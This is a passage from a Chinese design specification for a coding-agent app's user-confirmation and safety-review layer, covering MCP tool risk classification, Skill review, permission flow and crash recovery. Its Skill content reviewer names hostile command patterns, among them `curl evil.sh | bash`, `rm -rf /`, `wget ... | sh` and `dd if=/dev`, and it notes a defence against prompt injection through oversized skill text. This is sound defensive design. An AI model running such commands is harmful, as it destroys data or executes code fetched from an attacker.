| **C.2.11** | **开发者选项 & 调试工具** | 🟢 次要 | 方便回归测试和开发调试：<br/>① **设置页连点 7 次版本号 → 开启 ZTH Dev Menu**（类似 Android 开发者选项），内含：<br/>&nbsp;&nbsp;- 手动触发 fuse = OPEN / HALF_OPEN / CLOSED，无视 LINK-INV 铁律（仅 debug 版可见）<br/>&nbsp;&nbsp;- 查看当前 session 所有 sentinel（明文展示 sentinel_content，方便对比检查点）<br/>&nbsp;&nbsp;- 强制触发 FailureClass 的 16 个子类各一次，用于测试 ConfirmationCard 16 模板<br/>&nbsp;&nbsp;- 开关「跳过 LLM 审查直接弹手动确认」（用于离线时测 UI 路径）<br/>&nbsp;&nbsp;- 查看 HallucinationCircuitBreaker 的 6 态跃迁历史（最近 20 条）<br/>② **Debug 面板 UI**：复用现有 DebugDrawer 或新增 ZthDebugScreen Composable，release 编译时用 BuildConfig.DEBUG 隐藏。 |
| **C.2.12** | **数据库迁移兜底 & 一致性重建** | 🟡 重要 | 关联 §3.6 MigrationLoader：v33→v37 如果失败，fallbackToDestructiveMigration 会清 DB 重建，此时所有 sentinel 丢了。<br/>**必须决策**：<br/>① **Migration 失败后的 LINK-INV 重建**：fallback 触发后，启动时自动跑：<br/>&nbsp;&nbsp;- Step 1：COUNT zth_hallucination_fuse 行数 = 0 → 自动写 GLOBAL 行（fuse_state=CLOSED，rejection_count=0）<br/>&nbsp;&nbsp;- Step 2：COUNT user_confirmed_sentinel 行数 = 0 → 不补（sentinel 是一次性事务，丢了就丢了，下次有新消息重新生成）<br/>&nbsp;&nbsp;- Step 3：COUNT l0_soft_compact_restore_log 行数 = 0 → 不补（压缩日志是幂等还原用，没有日志就不还原）<br/>② **Migration 成功后的一致性断言**：v37 Migration 跑完，App 启动后异步跑 ZTH DB 自检（只在 debug 版或用户同意诊断时跑）：对每个 chatSession，断言 `session.sentinel_count == user_confirmed_sentinel WHERE session_id = X` 的计数 + LINK-INV-0 断言。若不一致，写 ERROR 日志，但不崩（用户数据完整性 > 架构洁癖）。 |
| **C.2.13** | **Skill + MCP 工具的 ZTH 审查路径** | 🔴 阻断 | 关联 C.1.3 / C.1.4：ZthCapabilityGuard（§4.1）审查的是 ToolCapability 枚举，但：<br/>① **MCP 第三方工具**：McpToolDescriptor 只有 `name/description/inputSchema`，没有 ToolCapability 字段，ZTH 不知道它是读还是写。<br/>**必须决策**：<br/>&nbsp;&nbsp;- 所有 MCP 工具默认归类为 `ToolCapability.UNCLASSIFIED_MCP`（新增枚举值）→ ZthCapabilityGuard 的启发式永远判「高风险」→ 强制走 LLM 审查，不能跳过。<br/>&nbsp;&nbsp;- ManageMcpTool.requireApprovalTools 配置的工具名 → 即使启发式判零风险，也强制过 ZthPlanApproval（用户手动批，因为 MCP 可能暴露危险操作如 `drop_table`）。<br/>② **Skill 系统的两步执行**：AI 调用 `loadSkill("frontend-deploy")` → 拿到 SKILL.md（可能 2000 字含 8 步）→ 再用 execute_command 分步执行。<br/>**必须决策**：<br/>&nbsp;&nbsp;- `loadSkill` 动作本身视为「读」= 零风险，启发式放行；<br/>&nbsp;&nbsp;- SKILL.md 正文在注入 LLM 上下文之前，先过 ZthContentReviewer → 若正文含恶意指令（`rm -rf /`、`curl evil.sh | bash`）则归 E8_MODEL_GEN，弹 ConfirmationCard 警告用户「技能「frontend-deploy」的指令可能有风险，是否继续加载？」<br/>&nbsp;&nbsp;- Skill.requiredTools 列出的 Bash(git push) 子模式 → 自动在 PermissionRulesRepository 中加一条临时 PROJECT 级的「需询问」规则，不直接放行（用户必须在权限弹窗点一次 ALWAYS 才会写入常久规则）。 |
| **C.2.14** | **跨设备同步（远期规划占位）** | 🟢 次要 | 如果后续做云端同步（当前 App 无），会遇到 ZTH 状态不一致：<br/>- 手机上 sentinel=AWAITING_CONFIRM（用户还没点），平板登录同一账号，能不能看到？如果能看到，两个设备同时点确认 → LINK-INV-0 双写。<br/>**v1.0 不实现**，但 DB Schema 预留下字段：<br/>`user_confirmed_sentinel.sync_key TEXT DEFAULT NULL`、`zth_hallucination_fuse.sync_updated_at INTEGER DEFAULT 0`。现在先填 NULL/0，后续同步功能上线后再用，**不需要 v37→v38 改 schema**。 |

---

### C.3 关联接口清单（上述遗漏模块与 ZTH 的连接点）

为把 C.1 模块与 ZTH 对接，需要新增/修改以下接口签名：

```kotlin
/* ─────────────────────────────────────────────
 * C.3.1 新增 FileSnapshotProvider 抽象（解决 C.1.7 + C.2.8）
 * ───────────────────────────────────────────── */
interface FileSnapshotProvider {
    /** 对 [filePath] 在当前 Checkpoint 内做首次快照。返回快照元信息用于还原。 */
    suspend fun snapshotIfFirstTime(
        sessionId: String,
        checkpointId: String,
        filePath: String
    ): FileSnapshotMeta?
}
data class FileSnapshotMeta(
    val snapshotPath: String,   // 本地临时文件路径（远端模式 = SFTP 下载到缓存）
    val changeType: String,     // "MODIFY" | "CREATE"
    val sha256: String
)

/* ─────────────────────────────────────────────
 * C.3.2 PermissionRulesRepository ↔ ZthCapabilityGuard 集成（解决 C.1.5）
 * ───────────────────────────────────────────── */
// 加在 PermissionRulesRepository 中
suspend fun evaluateZthCapabilityPrecheck(
    toolName: String,
    commandPrefix: String?, // shell 命令前缀（如 "git push"），非 shell 传 null
    scope: PermissionScope = PermissionScope.PROJECT
): ZthPermissionPrecheckResult

sealed class ZthPermissionPrecheckResult {
    data object PASS_BY_ALWAYS_RULE : ZthPermissionPrecheckResult()
        // 用户已选「始终允许」= ZTH 可跳过该工具的单条 Confirmation
        // （但全局 Plan 汇总确认不能省，ZTH-0 合规）
    data object BLOCK_BY_GLOBAL_DENY : ZthPermissionPrecheckResult()
        // 全局 DENY = ZTH 直接归类 E6_PERMISSION，不弹 Card 问用户（省时间）
    data object NO_RULE_MATCH : ZthPermissionPrecheckResult()
        // 无匹配 = 走正常 ZTH 审查 → 权限弹窗 → 工具执行 串行挂起两次
}

/* ─────────────────────────────────────────────
 * C.3.3 McpToolDescriptor → ToolCapability 映射（解决 C.1.3 + C.2.13）
 * ───────────────────────────────────────────── */
// 加在 enum class ToolCapability 中，新增 3 个值：
enum class ToolCapability {
    // ... 原有 10 个不变
    UNCLASSIFIED_MCP,          // 所有第三方 MCP 工具默认此值（高风险，强制 LLM 审查）
    MANAGE_MCP_CONFIG,         // ManageMcpTool(add_stdio/remove) 改配置
    LOAD_SKILL_INSTRUCTIONS,   // LoadSkillTool（读，低风险，但正文另过 ContentReviewer）
}
// 加在 McpClient 中：
fun inferToolCapabilities(descriptor: McpToolDescriptor): Set<ToolCapability> {
    // 启发式：名字含 read/list/get/query = READ；含 write/create/delete/update/exec/run = WRITE
    // 其余 = UNCLASSIFIED_MCP（强制 LLM 审查）
    val name = descriptor.name.lowercase()
    val caps = mutableSetOf<ToolCapability>()
    if (Regex("(read|list|get|query|search|cat|grep|find|stat)").containsMatchIn(name)) {
        caps += ToolCapability.READ_WORKSPACE
    }
    if (Regex("(write|create|delete|update|append|overwrite|remove|rm|replace|edit)").containsMatchIn(name)) {
        caps += ToolCapability.WRITE_WORKSPACE
    }
    if (Regex("(exec|run|execute|command|bash|shell|invoke)").containsMatchIn(name)) {
        caps += ToolCapability.EXECUTE_CODE
    }
    if (caps.isEmpty()) caps += ToolCapability.UNCLASSIFIED_MCP
    return caps
}

/* ─────────────────────────────────────────────
 * C.3.4 BackupSnapshot ↔ ZTH 表扩展（解决 C.1.6 + C.2.7）
 * ───────────────────────────────────────────── */
@Serializable
data class UserConfirmedSentinelDto(
    val id: String, val sessionId: String, val checkpointId: String?,
    val level: String, val planUid: String?, val contentHash: String,
    // 注意：不含 sentinel_content 明文！备份默认不含明文（隐私风险）
    val confirmedAt: Long, val rejectionCount: Int
)
@Serializable data class HallucinationFuseDto(/* 与 Entity 字段对齐，id 除外 */)
@Serializable data class SentinelPlanRejectionAuditDto(/* 与 Entity 字段对齐 */)
@Serializable data class HardConstraintDeleteAuditDto(/* 与 Entity 字段对齐 */)
@Serializable data class L0SoftCompactRestoreLogDto(/* 与 Entity 字段对齐 */)

/* ─────────────────────────────────────────────
 * C.3.5 崩溃恢复启动钩子（解决 C.2.1）
 * ───────────────────────────────────────────── */
// 加在 AgentSessionRepository.initialize() / App.onCreate() 流程中
interface ZthCrashRecoveryHook {
    /** 冷启动后扫描所有待决 sentinel、半完成 LINK-INV-0、半完成降级链。
     *  返回被自动恢复/清理的会话数，用于埋点。 */
    suspend fun runRecovery(): RecoveryStats
}
data class RecoveryStats(
    val resumedSentinelCards: Int = 0,   // 成功重弹 ConfirmationCard
    val expiredSentinelsCleaned: Int = 0,
    val halfCompletedLinksRebuilt: Int = 0,
    val danglingCompactionLogsCleaned: Int = 0
)

/* ─────────────────────────────────────────────
 * C.3.6 FeatureFlag zthModeEnabled 双重 kill-switch（解决 C.2.4）
 * ───────────────────────────────────────────── */
// 新建 FeatureFlagRepository（简单 DataStore boolean + 远程强制覆盖）
interface FeatureFlagRepository {
    val zthModeEnabledFlow: Flow<Boolean>
    suspend fun setZthModeEnabledLocal(value: Boolean)  // 设置页手切
    fun evaluateZthModeWithRemoteForce(): Boolean
        // = if (remote_force_disable == true) false else local_value
        // v1.0 远程未接入时默认 false 不强制，接了之后远程下发 true/false
}
```

---

### C.4 已拍板决策的细化实现规范（✅ 已决策，按此编码）

> 本节记录讨论后拍板的话题，补全精确到函数级伪代码 / SQL 片段 / UI 交互的落地规范。
> 标记：**✅ C.X.X → 方案 A** 对应上文 C 节决策。

---

#### C.4.1 ✅ C.1.5 权限系统 → 方案 A：ZTH 汇总卡 + 权限弹窗串行挂起

**执行顺序（绝对固定，不允许调换）**：

```
用户发消息
    ↓
[1] ZthCapabilityGuard(LLM 审查 + 本地启发式)
    ↓ 输出：Plan（含 N 个候选工具调用 + 单条风险评估）
[2] ZthPlanApproval（模型审批，仅档位 2/3）
    ↓
[3] 弹 ZTH ConfirmationCard「我计划执行以下 N 个操作…请确认」（用户点确认/拒绝）
    │  此时先调用 PermissionRulesRepository.evaluateZthCapabilityPrecheck() 过滤
    │  - PASS_BY_ALWAYS_RULE 的工具：从「待弹权限弹窗清单」中移除（省一次点击）
    │  - BLOCK_BY_GLOBAL_DENY 的工具：直接在 Plan 里标红，Card 文案改成
    │    「警告：操作 X 被全局权限策略禁止，本次跳过」→ 不执行该工具（但其他仍执行）
    │  - NO_RULE_MATCH 的工具：保留入「待弹权限弹窗清单」
    ↓ 用户点 CONFIRM → proceed
[4] 逐个执行待执行工具（跳过 BLOCK_BY_GLOBAL_DENY 已标红的）
    ↓ 对每个执行前先查 ToolPermissionPolicy
    ├─ ToolPermissionPolicy.NO_CHECK → 直接执行
    ├─ ToolPermissionPolicy.ASK → 弹权限弹窗（REJECT/ONCE/ALWAYS 三选一）
    │   ① REJECT → 工具返回 ToolResult.Error(code=USER_REJECTED)
    │   ② ONCE → 执行，不写规则
    │   ③ ALWAYS → 写 PROJECT 级 PermissionRule（ALWAYS → ALLOW）后执行
    └─ 执行 → ToolResult
    ↓
[5] ZthToolOutputGuard 审查工具输出 → 正常进入下一轮
```

**关键不变性**（违反即 ZTH-0 架构违规）：
1. **串行不变性**：步骤 [3] 的 ZTH Card 必须在步骤 [4] 的所有权限弹窗之前。禁止在 ZTH Card 未确认时先弹任何权限弹窗（防用户被多次打断不知所谓）。
2. **总卡不可省**：即使 PLAN 中所有单个工具都 PASS_BY_ALWAYS_RULE（即所有工具都不用弹权限弹窗），**ZTH 汇总 Card 依然必须弹**（ZTH-0 合规：用户至少确认一次完整 Plan，不能因为用户之前选过「始终允许 git push」就不告知本次 Plan 要 push 什么 commit）。
3. **GLOBAL DENY 最高优先级**：PermissionScope.GLOBAL DENY 的规则命中时，ZTH 审查中**直接标红跳过**，不会走到步骤 [4] 的权限弹窗（省时间 + 安全优先：全局禁的东西不用再问用户一次）。
4. **ALWAYS 不写 GLOBAL**：ZTH 流程中用户在权限弹窗点「始终允许」= 写 PROJECT 级规则（路径 `workspace/.rcodecore/permissions.json`），永远不会自动写 GLOBAL 级。用户要升级为全局只能去「权限管理」设置页手动操作（防误操作大范围放行）。

---

#### C.4.2 ✅ C.2.4 灰度开关 → 方案 A：默认关闭，手动开启

**FeatureFlagRepository 完整实现规范**（精确到字段）：

```kotlin
// 新增：feature_flags_prefs DataStore
private val Context.featureFlagsDataStore by preferencesDataStore(name = "feature_flags")

@Singleton
class FeatureFlagRepository @Inject constructor(
    @param:ApplicationContext private val context: Context,
    // 预留：远程配置接入点，v1.0 没接就写一个空实现的 provider 返回 null
    @OptionalRemoteConfig private val remoteConfig: RemoteConfigBridge? = null,
) {
    private companion object {
        val KEY_ZTH_MODE_ENABLED_LOCAL = booleanPreferencesKey("zth_mode_enabled_local")
        const val REMOTE_KEY_FORCE_DISABLE = "zth_mode_force_disable"
    }

    // Level 1：本地设置页手切，默认 false = 关（v1.0 不默认开启 ZTH）
    val zthModeEnabledLocalFlow: Flow<Boolean> =
        context.featureFlagsDataStore.data.map { it[KEY_ZTH_MODE_ENABLED_LOCAL] ?: false }

    // Level 2：远程 force_disable 覆盖。v1.0 远程未接入时 remoteConfig = null
    // → forceDisable 永远 false → 不覆盖本地值。接入远程后无需改此代码。
    private fun remoteForceDisable(): Boolean =
        remoteConfig?.getBoolean(REMOTE_KEY_FORCE_DISABLE) ?: false

    // 对外单一真相：最终是否启用 ZTH
    val zthModeEnabledFlow: Flow<Boolean> = combine(
        zthModeEnabledLocalFlow,
        // 远程值不做 Flow（Firebase RC 本身非响应式），每次 Flow 有新值都重新查一次
        flow { emit(remoteForceDisable()) }
    ) { local, forceDisable ->
        if (forceDisable) false else local
    }

    suspend fun setZthModeEnabledLocal(value: Boolean) {
        context.featureFlagsDataStore.edit { it[KEY_ZTH_MODE_ENABLED_LOCAL] = value }
        FileLogger.i("FeatureFlag", "ZTH Mode 本地切换为 $value")
    }

    /** 同步快照，避免协程环境下不方便拿 Flow。与 zthModeEnabledFlow 语义一致。 */
    fun evaluateZthModeWithRemoteForce(): Boolean {
        val local = runBlocking(Dispatchers.IO) {
            context.featureFlagsDataStore.data.first()[KEY_ZTH_MODE_ENABLED_LOCAL]
                ?: false
        }
        return if (remoteForceDisable()) false else local
    }
}

/** 远程配置桥接（v1.0 空实现，接 Firebase RC / 自建后实现）。 */
interface RemoteConfigBridge {
    fun getBoolean(key: String): Boolean
}
```

**StatefulAgentWorkflow 总开关注入点**（§10.1 H1 前置）：

```kotlin
// 在 StatefulAgentWorkflow 构造函数注入参数里加：
//   private val featureFlags: FeatureFlagRepository
// 然后在所有 ZTH 钩子调用的最外层包：

private suspend fun <T> withZthIfEnabled(block: suspend () -> T, fallback: () -> T): T {
    return if (featureFlags.evaluateZthModeWithRemoteForce()) {
        block()
    } else {
        // ZTH 关闭 = 走 legacy 路径，与 v1.0 前行为 100% 一致
        // 不调 CapabilityGuard，不弹 Card，不写 sentinel，不做压缩
        fallback()
    }
}

// 每个钩子调用（H1/H2/H3/H4/H5/H6/H7）都改写成：
//   withZthIfEnabled(block = { /* ZTH 逻辑 */ }, fallback = { /* legacy 直走 */ })
```

**单向回滚不变性**（禁止违反）：
1. 关 ZTH → 不删 5 张 ZTH 表，只让所有钩子走 legacy。
2. 再次开 ZTH → DB 中已有 sentinel / fuse 状态**全部继续有效**（sentinel AWAITING_CONFIRM 下次用户点会话自动重弹）。
3. 禁止写任何 v37 → v33 的反向 Migration：ZTH 列永远保留，关 ZTH 只是「不用」，不是「删」。
4. WorkManager 定期任务（每天 04:00 执行一次）：
   - 扫 `zthModeEnabled == false 已超过 7 days` → 把所有 state=AWAITING_CONFIRM 的 sentinel 行**软删除**（设 confirmed=2 / REJECTED_BY_TIMEOUT，不物理删除方便回滚）

---

#### C.4.3 ✅ C.2.1 崩溃恢复 → 方案 A：24h 过期 + 半完成续跑

**ZthCrashRecoveryHook 4 步执行流程规范**：

```kotlin
@Singleton
class ZthCrashRecoveryHookImpl @Inject constructor(
    private val sentinelDao: UserConfirmedSentinelDao,
    private val fuseDao: HallucinationFuseDao,
    private val l0LogDao: L0SoftCompactRestoreLogDao,
    private val auditDao: HardConstraintDeleteAuditDao,
    private val rejectionDao: SentinelPlanRejectionAuditDao,
    private val agentDatabase: AgentDatabase,  // 用于 @Transaction
    private val cardCoordinator: ZthCardCoordinator,  // 负责重弹 Card
) : ZthCrashRecoveryHook {

    private companion object {
        const val SENTINEL_EXPIRE_MS = 24 * 60 * 60 * 1000L  // 24 小时
        const val TAG = "ZthCrashRecovery"
    }

    @Transaction
    override suspend fun runRecovery(): RecoveryStats {
        var stats = RecoveryStats()

        // ── Step 1：清理过期 sentinel + LINK-INV-0 fallback ──────────────
        val now = System.currentTimeMillis()
        val expiredSentinels = sentinelDao.getAll().filter { s ->
            s.state == SentinelState.AWAITING_CONFIRM.ordinal
            && (now - s.createdAt) > SENTINEL_EXPIRE_MS
        }
        expiredSentinels.forEach { s ->
            // 写审计
            auditDao.insert(HardConstraintDeleteAuditEntity(
                sentinelId = s.id,
                sessionId = s.sessionId,
                checkpointId = s.checkpointId,
                reason = "CRASH_SENTINEL_EXPIRED",
                deletedAt = now
            ))
            sentinelDao.delete(s.id)
            stats = stats.copy(expiredSentinelsCleaned = stats.expiredSentinelsCleaned + 1)
            // LINK-INV-0 fallback：取 message_count 与 checkpoint_count 的较小值
            //   真实 counts 从 AgentSessionDao 查，此处伪代码省略
        }

        // ── Step 2：重弹未过期 sentinel（< 24h + 未确认）──────────────
        val validSentinels = sentinelDao.getAll().filter { s ->
            s.state == SentinelState.AWAITING_CONFIRM.ordinal
            && (now - s.createdAt) <= SENTINEL_EXPIRE_MS
        }
        validSentinels.forEach { s ->
            // 重弹 Card：INIT → LOADING → LOADED（沿用原 sentinel_id，不新建）
            cardCoordinator.resumePendingCard(sentinel = s)
            stats = stats.copy(resumedSentinelCards = stats.resumedSentinelCards + 1)
        }

        // ── Step 3：重建半完成 LINK-INV-0 ───────────────────────────────
        // FuseState 新增枚举值：TRANSITIONING = LINK-INV-0 正在 4 写中途崩
        val transitioningFuses = fuseDao.getAll().filter { it.fuseState == FuseState.TRANSITIONING.ordinal }
        transitioningFuses.forEach { fuse ->
            FileLogger.w(TAG, "检测到半完成 LINK-INV-0，重新执行: scope=${fuse.scope}, session=${fuse.sessionId}")
            // 重新完整跑 4 写（@Transaction 保证要么全成要么全回滚；前半已写的用 ON CONFLICT IGNORE 去重）
            relinkInvocationZero(fuse)  // LINK-INV-0 完整 4 写函数
            stats = stats.copy(halfCompletedLinksRebuilt = stats.halfCompletedLinksRebuilt + 1)
        }

        // ── Step 4：续跑半完成降级链（HALF + pending_cps=[L1]）──────────
        val danglingL0 = l0LogDao.getAll().filter {
            it.aborted == 1 && it.resultLevel == "HALF"
            && (now - it.createdAt) < 6 * 60 * 60 * 1000L  // 只续跑 6h 内的，太久的不续
        }
        danglingL0.forEach { log ->
            FileLogger.w(TAG, "检测到半完成 HALF 降级链，续跑 L1 审批: session=${log.sessionId}")
            cardCoordinator.continuePendingCompaction(
                abortedL0LogId = log.id,
                pendingLevel = "L1"
            )
            stats = stats.copy(danglingCompactionLogsCleaned = stats.danglingCompactionLogsCleaned + 1)
        }

        FileLogger.i(TAG, "崩溃恢复执行完毕: $stats")
        return stats
    }
}
```

**FuseState 枚举必须追加 TRANSITIONING 值**（§4.4.2 状态机从 6 态扩展到 7 态）：

```kotlin
enum class FuseState {
    CLOSED,          // 正常：允许 LLM 生成
    ARMED,           // 半警戒：累计 rejection_count=1
    HALF_OPEN,       // 冷却中：3 分钟只允许 PASS 1 次试放行
    OPEN,            // 熔断：禁止 LLM 生成所有操作，强制用户卡
    DISABLED_GLOBAL, // 用户手动档 0：档位禁用 Fuse
    RECOVERED,       // HALF_OPEN → PASS 1 次 → 回 CLOSED 前的瞬时态（6 态已有）
    TRANSITIONING,   // ✅ 新增：LINK-INV-0 4 写正在进行中（崩溃恢复用于识别半完成）
}
// 注意：TRANSITIONING 不暴露给 UI（UI 永远看不到这个态，只显示前 6 个）
// 它只存在于写入 LINK-INV-0 的 @Transaction 前后：
//   @Transaction fun linkInvocationZero(...) {
//       fuseDao.updateState(..., TRANSITIONING)       // 先标正在进行
//       sentinelDao.insert(...)                       // 写 1/4
//       rejectionAuditDao.deleteBySentinel(...)       // 写 2/4
//       updateSessionCountersForLink(...)             // 写 3/4
//       fuseDao.updateState(..., OPEN/ARMED/CLOSED)   // 写 4/4 终态（取代 TRANSITIONING）
//   }
//   如果在第 1 步后崩 → DB = TRANSITIONING → 下次 runRecovery 重建
```

**LINK-INV-0 fallback 公式**（sentinel 过期被删时用，不能让 session counters 和审计表差太多）：

```
sent_count_fallback = min(
    agent_session.message_count * 0.05,     // 粗估：5% 消息会触发 sentinel
    agent_session.checkpoint_count          // 上界：不超过检查点数量
)
```
此值只写进 HardConstraintDeleteAudit.estimated_effect_size 字段用于埋点，不回填 session.sentinel_count（防偏差累积）。

---

#### C.4.4 ✅ C.1.3 + C.2.13 MCP + Skill 工具审查 → 方案 A：启发式 + 强制批 + Skill 正文 E8 审查

**C.4.4.1 ToolCapability 枚举 3 个增加值（精确到位置）**：

```kotlin
enum class ToolCapability {
    // ---- 原有 10 个（按原代码顺序不变）----
    READ_WORKSPACE,        // 读文件/grep/ls/stat 等
    WRITE_WORKSPACE,       // 写/删/改文件
    EXECUTE_CODE,          // execute_command 运行任意命令
    MODIFY_AGENT_CONFIG,   // manageMcp 增删 MCP 配置
    READ_AGENT_CONFIG,     // manageMcp list / loadSkill 等
    CALL_LLM,              // 直接再调一次 LLM（嵌套）
    ACCESS_NETWORK,        // httpGet / curl 访问外网
    MODIFY_GIT_STATE,      // git commit / push / reset --hard
    MODIFY_PERMISSIONS,    // 改 permission.json / 授权
    UNDO_FILE_CHANGE,      // checkpoint 还原文件

    // ---- ✅ 以下 3 个新增，紧接在原有 10 个之后 ----
    UNCLASSIFIED_MCP,          // 第三方 MCP 工具：名字启发式匹配不到 → 高风险
    MANAGE_MCP_CONFIG,         // ManageMcpTool(add_stdio / remove) → 修改 Agent 配置
    LOAD_SKILL_INSTRUCTIONS,   // LoadSkillTool → 纯读动作（零风险启发式跳过 LLM）
}
```

**C.4.4.2 McpClient.inferToolCapabilities() 启发式规则（精确正则）**：

```kotlin
// 作为 McpClient 的成员函数，McpManager.connectOne() 握手完成后对每个 descriptor 调一次，
// 结果缓存到 Map<serverName-toolName, Set<ToolCapability>>，ZthCapabilityGuard 直接查缓存
fun inferToolCapabilities(descriptor: McpToolDescriptor): Set<ToolCapability> {
    val name = descriptor.name.lowercase()
    val caps = mutableSetOf<ToolCapability>()

    // 优先级 1：精确模式匹配（比下面的模糊正则优先级高）
    when {
        // 纯查询类 → 只读（零风险启发式跳过 LLM）
        Regex("""^(list|get|read|query|search|find|grep|stat|ls|cat|count|check|ping|echo|whoami|pwd|env(_?get)?)$""")
            .matches(name) -> caps += ToolCapability.READ_WORKSPACE

        // 写入类 → 写工作区（高风险 → 强制审查）
        Regex("""(write|create|add|new|insert|put|post|upload|append|overwrite|save|update|modify|edit|patch)""")
            .containsMatchIn(name) -> caps += ToolCapability.WRITE_WORKSPACE

        // 删除类 → 写工作区（高风险 → 强制审查）
        Regex("""(delete|remove|rm|drop|trash|clear|reset|purge)""")
            .containsMatchIn(name) -> caps += ToolCapability.WRITE_WORKSPACE

        // 执行/命令类 → 代码执行（最高风险）
        Regex("""(exec(ute)?|run|invoke|call|command|bash|shell|spawn|start|launch)""")
            .containsMatchIn(name) -> caps += ToolCapability.EXECUTE_CODE

        // git 状态变更 → MODIFY_GIT_STATE（高风险）
        Regex("""(git.*(commit|push|pull|reset|rebase|merge|checkout\s+-f|clean))""")
            .containsMatchIn(name) -> caps += ToolCapability.MODIFY_GIT_STATE

        // 网络访问（http_fetch / api call 等）
        Regex("""(http|fetch|request|curl|wget|download|api|send|post|get)""")
            .containsMatchIn(name) -> caps += ToolCapability.ACCESS_NETWORK
    }

    // 优先级 2：什么都没匹配到 → UNCLASSIFIED_MCP（高风险，强制走 LLM 审查，不能跳过）
    if (caps.isEmpty()) {
        caps += ToolCapability.UNCLASSIFIED_MCP
    }
    return caps
}
```

**C.4.4.3 ManageMcpTool.requireApprovalTools 的强制审查路径（精确条件）**：

```kotlin
// 在 ZthCapabilityGuard.detectToolRisks() 中追加：
// 对 McpToolDescriptor（非 ToolRegistry 内置）再查一层 McpServerConfig.requireApprovalTools
suspend fun evaluateMcpApprovalOverride(toolName: String): McpApprovalVerdict {
    val configs = mcpConfigRepository.getServers()
    // 查该 toolName 属于哪个 server（允许同名跨 server，只要一个命中就强制）
    val hit = configs.any { cfg ->
        cfg.enabled && toolName in cfg.requireApprovalTools
    }
    return if (hit) {
        // requireApprovalTools 命中 → 即使启发式是零风险（READ），也强制走 ZthPlanApproval 用户手动批
        McpApprovalVerdict.FORCE_PLAN_APPROVAL
    } else {
        McpApprovalVerdict.NORMAL_HEURISTIC
    }
}
enum class McpApprovalVerdict { NORMAL_HEURISTIC, FORCE_PLAN_APPROVAL }
```

**C.4.4.4 Skill 系统审查 4 条铁律（违反 = ZTH-0 架构违规）**：

1. **动作 loadSkill 零风险**：`LoadSkillTool` 本身归类 ToolCapability.LOAD_SKILL_INSTRUCTIONS（纯读） → 启发式判「零风险」→ 跳过 LLM 审查，直接执行（不弹权限弹窗，ToolPermissionPolicy 设为 NO_CHECK）。
2. **SKILL.md 正文必过 ZthContentReviewer**：skillRepository.loadInstructions(skillName) 返回的正文**在注入 LLM 上下文之前**，先调 `ZthContentReviewer.scanSkillInstructions(body)`：
   - 命中模式：`rm -rf /` / `curl [^ ]* | bash` / `wget .* -O- | sh` / `mkfs` / `dd if=/dev` / 「`chmod -R 777 /`」等 20+ 危险关键字正则 → **FailureClassifier 归 E8_MODEL_GEN**
   - E8_MODEL_GEN 弹 ConfirmationCard Type = SKILL_INSTRUCTION_RISK（新增模板，文案：「⚠️ 技能『frontend-deploy』的指令正文检测到潜在风险，是否继续加载？」+ 展示命中的危险行高亮）
   - 用户在 Card 点 CONFIRM → 加载成功，注入上下文；点 REJECT → loadSkill 返回 ToolResult.Error(SKILL_BLOCKED_BY_USER)
3. **Skill.requiredTools 不自动加 PermissionRule**：只作为 ZTH Plan 的「提示信息」展示给用户（Card 明细里写「该技能声明需要：Bash(git push)」），不自动写 PROJECT ALLOW；用户执行到对应工具时仍会触发权限弹窗（REJECT/ONCE/ALWAYS 三选一），防止技能自身带毒白嫖放行。
4. **SKILL.md ≤ 8KB 上限**：超过 8KB 的技能正文 → ContentReviewer 直接弹 warning「技能指令过长，请分多次加载」，自动截断后 4KB 不注入上下文（防 prompt injection 超长注入）。

---

#### C.4.5 ✅ C.1.1 + C.1.7 + C.2.8 远程 SSH 模式 → 方案 B：v1.0 ZTH 不支持远程 SSH

> **重大简化**：用户拍板方案 B，v1.0 不实现 FileSnapshotProvider 双实现 / SFTP 快照 / 远端 find / 路径映射调整等大量代码，直接禁用。

**强制生效总开关（在 withZthIfEnabled 之前再加一道前置判断）**：

```kotlin
// 写在 StatefulAgentWorkflow 的 withZthIfEnabled 函数内部最开头，或单独抽私有函数：
private suspend fun isZthActuallyRunnable(): Boolean {
    // 第 1 关：FeatureFlag 双重 kill-switch
    if (!featureFlags.evaluateZthModeWithRemoteForce()) return false

    // 第 2 关：✅ 远程 SSH 模式 → 直接不支持 ZTH
    if (executionModeHolder.currentMode() == ExecutionMode.REMOTE_SSH) return false

    // 第 3 关：容器引擎未就绪（ContainerInitState 不是 Ready） → 不做 ZTH，省资源
    if (!linuxContainerEngine.isContainerInstalled()) return false

    return true
}

// withZthIfEnabled 修改为：
private suspend fun <T> withZthIfEnabled(block: suspend () -> T, fallback: () -> T): T {
    return if (isZthActuallyRunnable()) block() else fallback()
}
```

**UI 三处同步置灰 / 提示**：

1. **设置页 ZTH 卡片**：当 ExecutionMode = REMOTE_SSH 时：
   - 整个 ZthPresetSelector 卡片 `enabled = false` + 半透明 alpha = 0.6f
   - 卡片顶部加一条橙色提示语（@StringRes）：`zth_remote_ssh_unsupported = "🔒 ZTH 模式暂不支持远程 SSH，请切回本地模式后开启"`
2. **会话页 ChainOverviewCard**：如果用户误进已开 ZTH 的会话（先开 ZTH 后切远程 SSH）：
   - 卡片显示红色提示语：「当前为远程 SSH 模式，ZTH 审查已临时禁用，本会话按零审查模式执行」
   - 所有 sentinel 确认不再弹出，走 legacy 直路
3. **版本号 7 连点 Dev Menu**：提供一个「强制在远程 SSH 开启 ZTH（实验性，不稳定）」的 debug 开关（只 debug 版可见），用于后续实现 v1.1 方案 A 时提前自测，release 版隐藏。

**状态归属不变性**：
- sentinel / fuse 等状态行带 `execution_mode = LOCAL / REMOTE_SSH` 列（v37 DB 预留字段），防止用户切模式后混淆；
- 切 REMOTE_SSH → 所有 LOCAL 模式下产生的 AWAITING_CONFIRM sentinel 不清理（用户切回 LOCAL 继续生效）；
- 在 REMOTE_SSH 下不写任何 ZTH 表（withZthIfEnabled = false → legacy 路径，不触发写）。

---

#### C.4.6 ✅ C.2.5 多会话并发 & 状态隔离 → 方案 A：session 级完全隔离 + global 级乐观锁

**C.4.6.1 CircuitBreaker 实例化规则（精确到 Map 键）**：

```kotlin
// 在 ZthModule.kt 里提供一个带缓存的 provider：
@Provides
@Singleton
fun provideHallucinationCircuitBreakerFactory(
    fuseDao: HallucinationFuseDao,
    params: ZthParamsSnapshot
): HallucinationCircuitBreakerFactory {
    return HallucinationCircuitBreakerFactory(fuseDao, params)
}

// Factory 按 sessionId 缓存实例（不跨 session 共享状态）
@Singleton
class HallucinationCircuitBreakerFactory @Inject constructor(
    private val fuseDao: HallucinationFuseDao,
    private val params: ZthParamsSnapshot,
) {
    // sessionId → 该 session 的 CircuitBreaker。ConcurrentHashMap（线程安全）。
